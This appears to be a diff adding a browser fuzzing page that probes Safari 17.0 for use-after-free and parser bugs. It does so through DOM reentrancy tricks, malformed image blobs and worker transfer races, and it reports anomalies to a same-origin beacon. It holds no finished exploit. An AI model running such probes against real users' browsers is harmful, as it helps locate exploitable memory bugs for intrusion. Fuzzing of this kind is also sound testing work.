@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P1045</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.pass{color:#22c55e}.fail{color:#ef4444}.warn{color:#f59e0b}.info{color:#38bdf8}
+h2{color:#7dd3fc;margin:8px 0 4px;font-size:13px}
+</style></head><body><div id="hud"><b class="info">P1045: DOM Mutation UAF + Parser Stress</b><br>
+<span class="warn">Targeting Safari 17.0 non-JIT bug classes...</span><div id="log"></div></div>
+<div id="arena" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden"></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1045-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+function lg(s,c){var d=document.getElementById('log');if(d){d.innerHTML+='<div class="'+(c||'info')+'">'+s+'</div>';d.scrollTop=d.scrollHeight;}}
+
+var arena=document.getElementById('arena');
+var crashes=0,anomalies=0,leaked=[];
+
+bn('BOOT','ts='+Date.now().toString(36));
+lg('P1045 booted - targeting DOM UAF patterns');
+
+// ======================================================================
+// PHASE A: MutationObserver callback DOM destruction (classic UAF vector)
+// When a MutationObserver fires, modifying the observed subtree can free
+// nodes still on the MutationRecord list. Safari 17.0 may not have all
+// the guards added in 17.2+.
+// ======================================================================
+setTimeout(function(){
+  lg('<h2>[A] MutationObserver Reentrancy UAF</h2>');
+  var results_a = {rounds:0, errors:0, anomalies:0};
+
+  try {
+    for(var round=0; round<50; round++){
+      var container = document.createElement('div');
+      arena.appendChild(container);
+
+      // Build a deep tree
+      var nodes = [];
+      var parent = container;
+      for(var i=0; i<20; i++){
+        var child = document.createElement('span');
+        child.textContent = 'node-'+i;
+        child.setAttribute('data-idx', i);
+        parent.appendChild(child);
+        nodes.push(child);
+        parent = child;
+      }
+
+      var mutCount = 0;
+      var observer = new MutationObserver(function(records){
+        mutCount += records.length;
+        // During callback, destroy the subtree being observed
+        try {
+          for(var r=0; r<records.length; r++){
+            var target = records[r].target;
+            if(target && target.parentNode){
+              // Remove all children recursively during iteration
+              while(target.firstChild) target.removeChild(target.firstChild);
+            }
+            // Try to access removed nodes from the record
+            var removed = records[r].removedNodes;
+            if(removed){
+              for(var n=0; n<removed.length; n++){
+                try {
+                  // Access freed node properties
+                  var tag = removed[n].tagName;
+                  var txt = removed[n].textContent;
+                  var attr = removed[n].getAttribute && removed[n].getAttribute('data-idx');
+                  // Check for corrupted values
+                  if(tag && tag !== 'SPAN' && tag !== 'DIV'){
+                    results_a.anomalies++;
+                    leaked.push('A-tag:'+tag);
+                  }
+                  if(attr && isNaN(parseInt(attr))){
+                    results_a.anomalies++;
+                    leaked.push('A-attr:'+attr);
+                  }
+                } catch(e2){}
+              }
+            }
+          }
+        } catch(e){ results_a.errors++; }
+      });
+
+      observer.observe(container, {childList:true, subtree:true, attributes:true, characterData:true});
+
+      // Trigger mutations rapidly
+      for(var i=nodes.length-1; i>=0; i--){
+        try {
+          if(nodes[i].parentNode) nodes[i].parentNode.removeChild(nodes[i]);
+        } catch(e){}
+      }
+
+      // Force synchronous layout between mutations
+      container.offsetHeight;
+
+      // Re-add and remove again
+      for(var i=0; i<5; i++){
+        var tmp = document.createElement('b');
+        tmp.textContent = 'refill-'+i;
+        container.appendChild(tmp);
+      }
+      container.innerHTML = '';
+      container.offsetHeight;
+
+      observer.disconnect();
+      arena.removeChild(container);
+      results_a.rounds++;
+    }
+  } catch(e){ results_a.errors++; }
+
+  var a_msg = 'rounds='+results_a.rounds+'|errors='+results_a.errors+'|anomalies='+results_a.anomalies+'|muts='+mutCount;
+  bn('A-MUTOBS', a_msg);
+  lg('[A] MutationObserver: '+a_msg, results_a.anomalies>0?'warn':'pass');
+
+  // Move to Phase B
+  setTimeout(phaseB, 10);
+}, 50);
+
+// ======================================================================
+// PHASE B: Range manipulation during DOM modification
+// Modifying a Range's boundaries while the tree changes can leave
+// dangling pointers in the Range object.
+// ======================================================================
+function phaseB(){
+  lg('<h2>[B] Range/Selection Dangling Reference</h2>');
+  var results_b = {rounds:0, errors:0, anomalies:0};
+
+  try {
+    for(var round=0; round<50; round++){
+      var container = document.createElement('div');
+      arena.appendChild(container);
+      container.innerHTML = '<p>Hello <b>world</b> this is <i>a <u>test</u></i> of ranges</p>';
+
+      var range = document.createRange();
+      var textNodes = [];
+      var walker = document.createTreeWalker(container, NodeFilter.SHOW_TEXT);
+      while(walker.nextNode()) textNodes.push(walker.currentNode);
+
+      if(textNodes.length >= 2){
+        range.setStart(textNodes[0], 0);
+        range.setEnd(textNodes[textNodes.length-1], textNodes[textNodes.length-1].length);
+
+        // Extract contents (removes from DOM)
+        var frag = range.extractContents();
+
+        // Try to use range after extraction
+        try {
+          var str = range.toString();
+          if(str.length > 0){
+            results_b.anomalies++;
+            leaked.push('B-range:'+str.slice(0,50));
+          }
+        } catch(e){}
+
+        // Re-insert fragment then delete while range might still reference it
+        container.appendChild(frag);
+
+        // Set range on re-inserted nodes
+        var newWalker = document.createTreeWalker(container, NodeFilter.SHOW_TEXT);
+        var firstText = newWalker.nextNode();
+        if(firstText){
+          range.selectNodeContents(firstText);
+          // Now delete the node
+          firstText.parentNode.removeChild(firstText);
+          // Access range
+          try {
+            var collapsed = range.collapsed;
+            var sc = range.startContainer;
+            var so = range.startOffset;
+            if(sc && sc.nodeType !== 1 && sc.nodeType !== 3 && sc.nodeType !== 9 && sc.nodeType !== 11){
+              results_b.anomalies++;
+              leaked.push('B-nodeType:'+sc.nodeType);
+            }
+          } catch(e){}
+        }
+      }
+
+      range.detach();
+      arena.removeChild(container);
+      results_b.rounds++;
+    }
+  } catch(e){ results_b.errors++; }
+
+  var b_msg = 'rounds='+results_b.rounds+'|errors='+results_b.errors+'|anomalies='+results_b.anomalies;
+  bn('B-RANGE', b_msg);
+  lg('[B] Range: '+b_msg, results_b.anomalies>0?'warn':'pass');
+
+  setTimeout(phaseC, 10);
+}
+
+// ======================================================================
+// PHASE C: Custom Element lifecycle callback reentrancy
+// connectedCallback/disconnectedCallback fire synchronously during DOM ops.
+// Manipulating the DOM from inside them can create UAF conditions.
+// ======================================================================
+function phaseC(){
+  lg('<h2>[C] Custom Element Lifecycle UAF</h2>');
+  var results_c = {rounds:0, errors:0, anomalies:0, callbacks:0};
+
+  try {
+    // Define a malicious custom element
+    var cbLog = [];
+
+    if(typeof customElements !== 'undefined'){
+      try {
+        customElements.define('evil-elem', class extends HTMLElement {
+          connectedCallback(){
+            results_c.callbacks++;
+            // During connection, modify our own parent's tree
+            try {
+              var p = this.parentNode;
+              if(p){
+                // Remove siblings while we're being added
+                var sibs = Array.from(p.children);
+                for(var i=0; i<sibs.length; i++){
+                  if(sibs[i] !== this && sibs[i].parentNode === p){
+                    p.removeChild(sibs[i]);
+                  }
+                }
+                // Add new children to ourselves
+                for(var j=0; j<3; j++){
+                  var s = document.createElement('span');
+                  s.textContent = 'injected-'+j;
+                  this.appendChild(s);
+                }
+              }
+            } catch(e){}
+          }
+          disconnectedCallback(){
+            results_c.callbacks++;
+            // Access our children during disconnection
+            try {
+              var kids = this.children;
+              for(var k=0; k<kids.length; k++){
+                var t = kids[k].tagName;
+                if(t && t !== 'SPAN' && t !== 'DIV'){
+                  results_c.anomalies++;
+                  leaked.push('C-disc:'+t);
+                }
+              }
+            } catch(e){}
+          }
+          adoptedCallback(){
+            results_c.callbacks++;
+          }
+          attributeChangedCallback(){
+            results_c.callbacks++;
+          }
+          static get observedAttributes(){ return ['data-x']; }
+        });
+      } catch(e){
+        // Already defined from previous run, ignore
+      }
+
+      for(var round=0; round<30; round++){
+        var container = document.createElement('div');
+        arena.appendChild(container);
+
+        // innerHTML with custom elements triggers lifecycle callbacks
+        var html = '';
+        for(var i=0; i<10; i++){
+          html += '<evil-elem data-x="'+i+'">child-'+i+'</evil-elem>';
+        }
+        container.innerHTML = html;
+        container.offsetHeight; // force layout
+
+        // Move elements between containers rapidly
+        var container2 = document.createElement('div');
+        arena.appendChild(container2);
+
+        while(container.firstChild){
+          container2.appendChild(container.firstChild); // triggers disconnect+connect
+        }
+
+        // Adopt into a new document
+        try {
+          var doc2 = document.implementation.createHTMLDocument('test');
+          while(container2.firstChild){
+            doc2.body.appendChild(doc2.adoptNode(container2.firstChild));
+          }
+        } catch(e){}
+
+        arena.removeChild(container);
+        arena.removeChild(container2);
+        results_c.rounds++;
+      }
+    } else {
+      results_c.errors = -1; // customElements not available
+    }
+  } catch(e){ results_c.errors++; }
+
+  var c_msg = 'rounds='+results_c.rounds+'|errors='+results_c.errors+'|anomalies='+results_c.anomalies+'|cbs='+results_c.callbacks;
+  bn('C-CUSTOM', c_msg);
+  lg('[C] Custom Elements: '+c_msg, results_c.anomalies>0?'warn':'pass');
+
+  setTimeout(phaseD, 10);
+}
+
+// ======================================================================
+// PHASE D: structuredClone edge cases + transfer bugs
+// Serialization/deserialization of complex object graphs can have bugs
+// when objects are modified during the cloning process.
+// ======================================================================
+function phaseD(){
+  lg('<h2>[D] structuredClone Transfer Edge Cases</h2>');
+  var results_d = {tests:0, errors:0, anomalies:0};
+
+  try {
+    // Test 1: Transfer then access (should be detached)
+    var ab1 = new ArrayBuffer(1024);
+    var u8_1 = new Uint8Array(ab1);
+    for(var i=0; i<1024; i++) u8_1[i] = i & 0xFF;
+
+    var cloned = structuredClone(ab1, {transfer:[ab1]});
+    results_d.tests++;
+
+    // ab1 should be detached
+    if(ab1.byteLength !== 0){
+      results_d.anomalies++;
+      leaked.push('D-notdetached:'+ab1.byteLength);
+    }
+
+    // Test 2: Clone complex object graph with circular refs
+    var obj = {a: new ArrayBuffer(256), b: new ArrayBuffer(256)};
+    var u8a = new Uint8Array(obj.a);
+    var u8b = new Uint8Array(obj.b);
+    for(var i=0; i<256; i++){ u8a[i]=0xAA; u8b[i]=0xBB; }
+
+    var c2 = structuredClone(obj, {transfer:[obj.a]});
+    results_d.tests++;
+
+    // obj.a should be detached, obj.b should still work
+    if(obj.a.byteLength !== 0){
+      results_d.anomalies++;
+      leaked.push('D-partial:'+obj.a.byteLength);
+    }
+    // Check c2.b is a copy not obj.b
+    var u8c2b = new Uint8Array(c2.b);
+    if(u8c2b[0] !== 0xBB){
+      results_d.anomalies++;
+      leaked.push('D-copy:'+u8c2b[0]);
+    }
+
+    // Test 3: Transfer MessagePort
+    if(typeof MessageChannel !== 'undefined'){
+      var mc = new MessageChannel();
+      var received = false;
+      mc.port2.onmessage = function(e){ received = true; };
+
+      // Clone port1 via transfer
+      try {
+        var p1clone = structuredClone(mc.port1, {transfer:[mc.port1]});
+        p1clone.postMessage('test');
+        results_d.tests++;
+      } catch(e){ results_d.errors++; }
+    }
+
+    // Test 4: Large nested structure with shared ArrayBuffers
+    var shared_data = new ArrayBuffer(4096);
+    var sv = new Uint8Array(shared_data);
+    for(var i=0; i<4096; i++) sv[i] = 0xDE;
+
+    var complex = {
+      views: [],
+      nested: {deep: {deeper: {ab: shared_data}}}
+    };
+    for(var i=0; i<10; i++){
+      complex.views.push(new Uint8Array(shared_data, i*100, 100));
+    }
+
+    try {
+      var c3 = structuredClone(complex);
+      results_d.tests++;
+      // Check all views reference the SAME cloned buffer
+      var sameBuffer = true;
+      for(var i=1; i<c3.views.length; i++){
+        if(c3.views[i].buffer !== c3.views[0].buffer) sameBuffer = false;
+      }
+      if(!sameBuffer){
+        results_d.anomalies++;
+        leaked.push('D-shared:different_buffers');
+      }
+    } catch(e){ results_d.errors++; }
+
+    // Test 5: Resizable ArrayBuffer transfer
+    try {
+      var rab = new ArrayBuffer(64, {maxByteLength: 4096});
+      var rv = new Uint8Array(rab);
+      for(var i=0; i<64; i++) rv[i] = 0xCC;
+
+      rab.resize(128);
+      var c4 = structuredClone(rab, {transfer:[rab]});
+      results_d.tests++;
+
+      if(rab.byteLength !== 0){
+        results_d.anomalies++;
+        leaked.push('D-rab:'+rab.byteLength);
+      }
+
+      // Check cloned RAB
+      var c4v = new Uint8Array(c4);
+      if(c4.byteLength !== 128){
+        results_d.anomalies++;
+        leaked.push('D-rabsize:'+c4.byteLength);
+      }
+      // Check if resizable property survived
+      try {
+        c4.resize(256);
+        results_d.tests++;
+      } catch(e){
+        results_d.anomalies++;
+        leaked.push('D-rabresize:fail');
+      }
+    } catch(e){ results_d.errors++; }
+
+  } catch(e){ results_d.errors++; }
+
+  var d_msg = 'tests='+results_d.tests+'|errors='+results_d.errors+'|anomalies='+results_d.anomalies;
+  bn('D-CLONE', d_msg);
+  lg('[D] structuredClone: '+d_msg, results_d.anomalies>0?'warn':'pass');
+
+  setTimeout(phaseE, 10);
+}
+
+// ======================================================================
+// PHASE E: CSS Parser Stress (deep nesting, calc(), @supports)
+// CSS parsing bugs can corrupt memory without involving JIT.
+// ======================================================================
+function phaseE(){
+  lg('<h2>[E] CSS Parser Deep Stress</h2>');
+  var results_e = {tests:0, errors:0, anomalies:0};
+
+  try {
+    // Test 1: Deeply nested calc()
+    var calcExpr = '1px';
+    for(var i=0; i<100; i++){
+      calcExpr = 'calc('+calcExpr+' + 1px)';
+    }
+
+    var style1 = document.createElement('style');
+    style1.textContent = '.deep-calc { width: '+calcExpr+'; }';
+    document.head.appendChild(style1);
+
+    var el = document.createElement('div');
+    el.className = 'deep-calc';
+    arena.appendChild(el);
+    var w = getComputedStyle(el).width;
+    results_e.tests++;
+
+    arena.removeChild(el);
+    document.head.removeChild(style1);
+
+    // Test 2: Massive selector list
+    var selectors = [];
+    for(var i=0; i<500; i++){
+      selectors.push('.s'+i+' > .c'+i+' + .n'+i+' ~ .x'+i+':nth-child('+(i+1)+')');
+    }
+    var style2 = document.createElement('style');
+    style2.textContent = selectors.join(',') + ' { color: red; }';
+    document.head.appendChild(style2);
+    results_e.tests++;
+    document.head.removeChild(style2);
+
+    // Test 3: @supports nesting
+    var supportsCSS = '';
+    var depth = 20;
+    for(var i=0; i<depth; i++){
+      supportsCSS += '@supports (display: flex) { ';
+    }
+    supportsCSS += '.nested-supports { color: lime; }';
+    for(var i=0; i<depth; i++) supportsCSS += ' }';
+
+    var style3 = document.createElement('style');
+    style3.textContent = supportsCSS;
+    document.head.appendChild(style3);
+    results_e.tests++;
+    document.head.removeChild(style3);
+
+    // Test 4: CSS variable cycle (should be detected, but edge cases exist)
+    var style4 = document.createElement('style');
+    style4.textContent = ':root { --a: var(--b); --b: var(--c); --c: var(--a); } .cycle-test { width: var(--a); }';
+    document.head.appendChild(style4);
+    var cyc = document.createElement('div');
+    cyc.className = 'cycle-test';
+    arena.appendChild(cyc);
+    var cw = getComputedStyle(cyc).width;
+    results_e.tests++;
+    arena.removeChild(cyc);
+    document.head.removeChild(style4);
+
+    // Test 5: @font-face with unusual descriptors
+    var style5 = document.createElement('style');
+    style5.textContent = '@font-face { font-family: "X"; src: url(data:font/woff2;base64,AAAAAAA) format("woff2"); unicode-range: U+0-10FFFF; font-display: swap; font-weight: 1 999; font-stretch: 50% 200%; }';
+    document.head.appendChild(style5);
+    results_e.tests++;
+    document.head.removeChild(style5);
+
+    // Test 6: Rapid stylesheet add/remove (CSSOM stress)
+    for(var i=0; i<100; i++){
+      var s = document.createElement('style');
+      s.textContent = '.x'+i+'{color:rgb('+i+','+i+','+i+')}';
+      document.head.appendChild(s);
+      if(i%3===0){
+        document.head.removeChild(s);
+      }
+    }
+    // Clean up remaining
+    var heads = document.head.querySelectorAll('style');
+    for(var i=0; i<heads.length; i++){
+      if(heads[i].textContent.indexOf('.x')===0){
+        document.head.removeChild(heads[i]);
+      }
+    }
+    results_e.tests++;
+
+  } catch(e){ results_e.errors++; }
+
+  var e_msg = 'tests='+results_e.tests+'|errors='+results_e.errors+'|anomalies='+results_e.anomalies;
+  bn('E-CSS', e_msg);
+  lg('[E] CSS Parser: '+e_msg, results_e.anomalies>0?'warn':'pass');
+
+  setTimeout(phaseF, 10);
+}
+
+// ======================================================================
+// PHASE F: Image format fuzzing via Blob URLs
+// Create malformed images as blobs and load them. Parser bugs can trigger
+// without JIT. Test: truncated PNG, malformed JPEG, oversized dimensions.
+// ======================================================================
+function phaseF(){
+  lg('<h2>[F] Image Parser Fuzz via Blob</h2>');
+  var results_f = {tested:0, loaded:0, errors:0, anomalies:0};
+  var pending = 0;
+
+  function testImage(bytes, name, cb){
+    var blob = new Blob([new Uint8Array(bytes)], {type:'image/png'});
+    var url = URL.createObjectURL(blob);
+    var img = new Image();
+    pending++;
+
+    img.onload = function(){
+      results_f.loaded++;
+      results_f.tested++;
+      // Try drawing to canvas to trigger decode
+      try {
+        var c = document.createElement('canvas');
+        c.width = img.naturalWidth || 1;
+        c.height = img.naturalHeight || 1;
+        var ctx = c.getContext('2d');
+        ctx.drawImage(img, 0, 0);
+        var data = ctx.getImageData(0, 0, c.width, c.height);
+        // Scan for non-zero unexpected data
+        var nonzero = 0;
+        for(var i=0; i<Math.min(data.data.length,1000); i++){
+          if(data.data[i] !== 0) nonzero++;
+        }
+      } catch(e){}
+      URL.revokeObjectURL(url);
+      pending--;
+      if(cb) cb();
+    };
+    img.onerror = function(){
+      results_f.errors++;
+      results_f.tested++;
+      URL.revokeObjectURL(url);
+      pending--;
+      if(cb) cb();
+    };
+    img.src = url;
+  }
+
+  // Malformed PNG: valid signature, bad IHDR
+  var badPNG1 = [0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A, // PNG sig
+    0x00,0x00,0x00,0x0D, // IHDR length
+    0x49,0x48,0x44,0x52, // IHDR type
+    0xFF,0xFF,0xFF,0xFF, // width (huge)
+    0xFF,0xFF,0xFF,0xFF, // height (huge)
+    0x08, // bit depth
+    0x06, // color type RGBA
+    0x00,0x00,0x00, // compression, filter, interlace
+    0x00,0x00,0x00,0x00 // CRC (bad)
+  ];
+
+  // Truncated PNG: valid header, no IDAT
+  var truncPNG = [0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,
+    0x00,0x00,0x00,0x0D,
+    0x49,0x48,0x44,0x52,
+    0x00,0x00,0x00,0x04, // width 4
+    0x00,0x00,0x00,0x04, // height 4
+    0x08,0x06,0x00,0x00,0x00,
+    0xA9,0xF1,0x9E,0x7E // valid CRC for 4x4 RGBA
+  ];
+
+  // PNG with integer overflow in dimensions
+  var overflowPNG = [0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,
+    0x00,0x00,0x00,0x0D,
+    0x49,0x48,0x44,0x52,
+    0x7F,0xFF,0xFF,0xFF, // width near INT32_MAX
+    0x00,0x00,0x00,0x01, // height 1
+    0x08,0x02,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00
+  ];
+
+  // Malformed JPEG: bad marker sequence
+  var badJPEG = [0xFF,0xD8,0xFF,0xE0, // SOI + APP0
+    0x00,0x10, // length 16
+    0x4A,0x46,0x49,0x46,0x00, // JFIF
+    0x01,0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,
+    0xFF,0xC0, // SOF0
+    0x00,0x0B, // length 11
+    0x08, // precision
+    0xFF,0xFF, // height 65535
+    0xFF,0xFF, // width 65535
+    0x03, // components
+    0x01,0x11,0x00,
+    0xFF,0xD9 // EOI (premature)
+  ];
+
+  // GIF with LZW bomb
+  var badGIF = [0x47,0x49,0x46,0x38,0x39,0x61, // GIF89a
+    0x01,0x00,0x01,0x00, // 1x1
+    0x80,0x00,0x00, // GCT flag
+    0xFF,0xFF,0xFF, // white
+    0x00,0x00,0x00, // black
+    0x2C, // image descriptor
+    0x00,0x00,0x00,0x00, // left/top
+    0x01,0x00,0x01,0x00, // width/height
+    0x00, // no LCT
+    0x02, // LZW min code size
+    0xFF, // 255 bytes sub-block (lie - not enough data)
+  ];
+  // Fill with garbage
+  for(var i=0; i<255; i++) badGIF.push(i & 0xFF);
+  badGIF.push(0x00); // block terminator
+  badGIF.push(0x3B); // GIF trailer
+
+  // WebP with bad VP8 header
+  var badWebP = [
+    0x52,0x49,0x46,0x46, // RIFF
+    0x24,0x00,0x00,0x00, // file size
+    0x57,0x45,0x42,0x50, // WEBP
+    0x56,0x50,0x38,0x20, // VP8
+    0x18,0x00,0x00,0x00, // chunk size
+    0x30,0x01,0x00,0x9D,0x01,0x2A, // VP8 bitstream header
+    0xFF,0x7F,0xFF,0x7F, // width/height (huge)
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00,0x00,0x00
+  ];
+
+  var images = [
+    [badPNG1, 'badPNG-huge'],
+    [truncPNG, 'truncPNG'],
+    [overflowPNG, 'overflowPNG'],
+    [badJPEG, 'badJPEG'],
+    [badGIF, 'badGIF-lzw'],
+    [badWebP, 'badWebP']
+  ];
+
+  var idx = 0;
+  function nextImage(){
+    if(idx >= images.length){
+      var f_msg = 'tested='+results_f.tested+'|loaded='+results_f.loaded+'|errors='+results_f.errors+'|anomalies='+results_f.anomalies;
+      bn('F-IMGFUZZ', f_msg);
+      lg('[F] Image fuzz: '+f_msg, results_f.anomalies>0?'warn':'pass');
+      setTimeout(phaseG, 10);
+      return;
+    }
+    testImage(images[idx][0], images[idx][1], function(){
+      idx++;
+      nextImage();
+    });
+  }
+  nextImage();
+}
+
+// ======================================================================
+// PHASE G: Worker message race conditions
+// Send rapid messages with transferables to workers, aiming for races
+// in the serialization/deserialization path.
+// ======================================================================
+function phaseG(){
+  lg('<h2>[G] Worker Transfer Race</h2>');
+  var results_g = {msgs:0, errors:0, anomalies:0, workerOk:false};
+
+  try {
+    var workerCode = 'self.onmessage=function(e){' +
+      'var d=e.data;' +
+      'if(d.ab){' +
+        'try{var v=new Uint8Array(d.ab);var s=0;for(var i=0;i<v.length;i++)s+=v[i];' +
+        'self.postMessage({id:d.id,sum:s,len:v.length});}' +
+        'catch(x){self.postMessage({id:d.id,err:x.message});}' +
+      '}else{self.postMessage({id:d.id,noab:true});}' +
+    '};';
+
+    var blob = new Blob([workerCode], {type:'application/javascript'});
+    var url = URL.createObjectURL(blob);
+    var w = new Worker(url);
+    results_g.workerOk = true;
+
+    var responses = {};
+    w.onmessage = function(e){
+      results_g.msgs++;
+      responses[e.data.id] = e.data;
+      if(e.data.err){
+        results_g.errors++;
+      }
+    };
+
+    // Send many rapid transfers
+    var sent = 0;
+    for(var i=0; i<100; i++){
+      var ab = new ArrayBuffer(256);
+      var view = new Uint8Array(ab);
+      for(var j=0; j<256; j++) view[j] = (i+j) & 0xFF;
+
+      try {
+        w.postMessage({id:i, ab:ab}, [ab]);
+        sent++;
+        // Immediately try to access the transferred buffer
+        if(ab.byteLength !== 0){
+          results_g.anomalies++;
+          leaked.push('G-notdetached:'+i);
+        }
+      } catch(e){
+        results_g.errors++;
+      }
+    }
+
+    // Also test: double-transfer (same buffer in array twice)
+    try {
+      var ab2 = new ArrayBuffer(128);
+      w.postMessage({id:999, ab:ab2}, [ab2, ab2]); // should throw
+      results_g.anomalies++;
+      leaked.push('G-doubletransfer:accepted');
+    } catch(e){
+      // Expected: TypeError for duplicate transfer
+    }
+
+    // Give worker time to process, then collect
+    setTimeout(function(){
+      w.terminate();
+      URL.revokeObjectURL(url);
+
+      var g_msg = 'sent='+sent+'|recv='+results_g.msgs+'|errors='+results_g.errors+'|anomalies='+results_g.anomalies+'|worker='+results_g.workerOk;
+      bn('G-WORKER', g_msg);
+      lg('[G] Worker race: '+g_msg, results_g.anomalies>0?'warn':'pass');
+
+      setTimeout(phaseH, 10);
+    }, 500);
+
+  } catch(e){
+    results_g.errors++;
+    var g_msg = 'worker=false|err='+e.message;
+    bn('G-WORKER', g_msg);
+    lg('[G] Worker: '+g_msg, 'fail');
+    setTimeout(phaseH, 10);
+  }
+}
+
+// ======================================================================
+// PHASE H: Shadow DOM slot reassignment stress
+// Rapidly reassigning slots can create dangling references in the
+// slot assignment algorithm.
+// ======================================================================
+function phaseH(){
+  lg('<h2>[H] Shadow DOM Slot Stress</h2>');
+  var results_h = {rounds:0, errors:0, anomalies:0};
+
+  try {
+    if(typeof HTMLElement.prototype.attachShadow === 'undefined'){
+      results_h.errors = -1;
+    } else {
+      for(var round=0; round<30; round++){
+        var host = document.createElement('div');
+        arena.appendChild(host);
+
+        var shadow = host.attachShadow({mode:'open'});
+
+        // Create named slots
+        for(var i=0; i<5; i++){
+          var slot = document.createElement('slot');
+          slot.name = 'slot-'+i;
+          shadow.appendChild(slot);
+        }
+        // Default slot
+        shadow.appendChild(document.createElement('slot'));
+
+        // Add slotted children
+        for(var i=0; i<20; i++){
+          var child = document.createElement('span');
+          child.slot = 'slot-'+(i%5);
+          child.textContent = 'slotted-'+i;
+          host.appendChild(child);
+        }
+
+        host.offsetHeight; // force layout
+
+        // Rapidly reassign slots
+        var children = Array.from(host.children);
+        for(var i=0; i<children.length; i++){
+          children[i].slot = 'slot-'+((i+2)%5);
+        }
+        host.offsetHeight;
+
+        // Remove slots while children are assigned
+        var slots = shadow.querySelectorAll('slot');
+        for(var i=0; i<slots.length; i++){
+          shadow.removeChild(slots[i]);
+        }
+        host.offsetHeight;
+
+        // Check children are still accessible
+        for(var i=0; i<children.length; i++){
+          try {
+            var t = children[i].textContent;
+            if(!t.startsWith('slotted-')){
+              results_h.anomalies++;
+              leaked.push('H-slot:'+t.slice(0,20));
+            }
+          } catch(e){ results_h.errors++; }
+        }
+
+        arena.removeChild(host);
+        results_h.rounds++;
+      }
+    }
+  } catch(e){ results_h.errors++; }
+
+  var h_msg = 'rounds='+results_h.rounds+'|errors='+results_h.errors+'|anomalies='+results_h.anomalies;
+  bn('H-SHADOW', h_msg);
+  lg('[H] Shadow DOM: '+h_msg, results_h.anomalies>0?'warn':'pass');
+
+  setTimeout(phaseI, 10);
+}
+
+// ======================================================================
+// PHASE I: Event dispatch reentrancy (DOM modification during events)
+// Modifying the DOM tree during event bubbling/capture can free nodes
+// that the event dispatcher still references.
+// ======================================================================
+function phaseI(){
+  lg('<h2>[I] Event Dispatch Reentrancy</h2>');
+  var results_i = {rounds:0, errors:0, anomalies:0, dispatched:0};
+
+  try {
+    for(var round=0; round<30; round++){
+      var container = document.createElement('div');
+      arena.appendChild(container);
+
+      // Build nested tree with event listeners at every level
+      var nodes = [container];
+      var current = container;
+      for(var i=0; i<15; i++){
+        var child = document.createElement('div');
+        child.id = 'evt-'+round+'-'+i;
+        current.appendChild(child);
+        nodes.push(child);
+        current = child;
+      }
+
+      var deepest = current;
+
+      // Add capture listeners that destroy the tree
+      nodes[3].addEventListener('click', function(e){
+        results_i.dispatched++;
+        // Remove nodes ahead in the bubbling path
+        try {
+          if(nodes[7] && nodes[7].parentNode) nodes[7].parentNode.removeChild(nodes[7]);
+          if(nodes[5] && nodes[5].parentNode) nodes[5].parentNode.removeChild(nodes[5]);
+        } catch(x){}
+      }, true); // capture phase
+
+      // Add bubble listeners on nodes that will be removed
+      nodes[7].addEventListener('click', function(e){
+        results_i.dispatched++;
+        results_i.anomalies++; // This shouldn't fire if node was removed!
+        leaked.push('I-ghost:node7');
+      }, false);
+
+      nodes[5].addEventListener('click', function(e){
+        results_i.dispatched++;
+        results_i.anomalies++;
+        leaked.push('I-ghost:node5');
+      }, false);
+
+      // Dispatch event on deepest node
+      var evt = new MouseEvent('click', {bubbles:true, cancelable:true});
+      deepest.dispatchEvent(evt);
+
+      arena.removeChild(container);
+      results_i.rounds++;
+    }
+  } catch(e){ results_i.errors++; }
+
+  var i_msg = 'rounds='+results_i.rounds+'|errors='+results_i.errors+'|anomalies='+results_i.anomalies+'|dispatched='+results_i.dispatched;
+  bn('I-EVENT', i_msg);
+  lg('[I] Event reentrancy: '+i_msg, results_i.anomalies>0?'warn':'pass');
+
+  setTimeout(phaseFinal, 10);
+}
+
+// ======================================================================
+// FINAL: Summary
+// ======================================================================
+function phaseFinal(){
+  var summary = 'crashes='+crashes+'|anomalies='+anomalies+'|leaked='+leaked.length;
+  if(leaked.length > 0) summary += '|items='+leaked.slice(0,20).join(';');
+
+  bn('DONE', summary);
+  lg('<h2>COMPLETE</h2>', leaked.length>0?'warn':'pass');
+  lg('Total anomalies: '+leaked.length, leaked.length>0?'warn':'pass');
+  if(leaked.length > 0){
+    for(var i=0; i<Math.min(leaked.length,30); i++){
+      lg('  '+leaked[i], 'warn');
+    }
+  } else {
+    lg('No anomalies detected across all phases.', 'pass');
+  }
+}
+
+</script></body></html>
